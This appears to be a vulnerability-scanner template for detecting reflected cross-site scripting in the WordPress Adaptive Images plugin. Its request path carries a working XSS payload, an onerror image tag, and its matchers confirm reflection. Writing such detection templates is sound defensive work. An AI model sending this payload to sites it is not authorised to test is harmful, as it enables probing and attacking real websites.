id: "wp-adaptive-xss"
name: "WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting"
severity: "high"
description: "WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page."
tech:
  - "wordpress"
  - "php"
tags:
  - "wpscan"
  - "wordpress"
  - "xss"
  - "wp-plugin"
  - "wp"
  - "vuln"
cwe: "CWE-79"
reference: "https://wpscan.com/vulnerability/eef137af-408c-481c-8493-afe6ee2105d0"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<img/src/onerror=alert(document.domain)>"
      - "<td>Image</td>"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
